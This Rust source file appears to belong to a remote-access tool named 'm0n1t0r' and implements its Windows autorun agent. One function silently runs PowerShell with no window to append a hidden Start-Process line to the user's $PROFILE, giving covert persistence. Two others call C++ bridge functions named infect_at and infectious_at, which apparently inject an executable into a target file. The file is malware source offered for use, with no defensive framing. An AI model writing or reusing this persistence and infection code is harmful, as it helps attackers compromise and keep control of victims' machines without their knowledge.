use m0n1t0r_common::{Error, Result as AppResult};
use remoc::rtc;
use std::{path::PathBuf, thread};
use tokio::{process::Command, sync::oneshot};
use winapi::um::winbase::CREATE_NO_WINDOW;

pub struct AgentObj {}

impl AgentObj {
    pub fn new() -> Self {
        Self {}
    }
}

#[rtc::async_trait]
impl m0n1t0r_common::autorun::Agent for AgentObj {
    async fn exist_current_user(&self) -> AppResult<bool> {
        Err(Error::Unimplemented)
    }

    async fn remove_current_user(&self) -> AppResult<()> {
        Err(Error::Unimplemented)
    }

    async fn add_current_user_at(&self, exe: PathBuf) -> AppResult<()> {
        let mut payload = String::new();
        payload.push_str("\"`nStart-Process '");
        payload.push_str(exe.to_str().ok_or(Error::InvalidParameter)?);
        payload.push_str("' -WindowStyle Hidden`n\"");

        Command::new("powershell")
            .arg("-Command")
            .arg("Add-Content")
            .arg("-Path")
            .arg("$PROFILE")
            .arg("-Value")
            .arg(payload)
            .creation_flags(CREATE_NO_WINDOW)
            .output()
            .await?;
        Ok(())
    }

    async fn infect_at(&self, target: PathBuf, exe: PathBuf) -> AppResult<bool> {
        let (tx, rx) = oneshot::channel();

        thread::spawn(move || {
            let _ = tx.send(ffi::infect_at(
                target.to_string_lossy().to_string(),
                exe.to_string_lossy().to_string(),
            )?);
            Ok::<_, anyhow::Error>(())
        });
        Ok(rx.await?.into())
    }

    async fn infectious_at(&self, target: PathBuf, exe: PathBuf) -> AppResult<bool> {
        let (tx, rx) = oneshot::channel();

        thread::spawn(move || {
            let _ = tx.send(ffi::infectious_at(
                target.to_string_lossy().to_string(),
                exe.to_string_lossy().to_string(),
            )?);
            Ok::<_, anyhow::Error>(())
        });
        Ok(rx.await?.into())
    }
}

#[cxx::bridge]
mod ffi {
    extern "Rust" {}

    unsafe extern "C++" {
        include!("m0n1t0r-client/m0n1t0r-cpp-windows-lib/include/autorun.h");

        fn infect_at(target: String, exe: String) -> Result<bool>;

        fn infectious_at(target: String, exe: String) -> Result<bool>;
    }
}
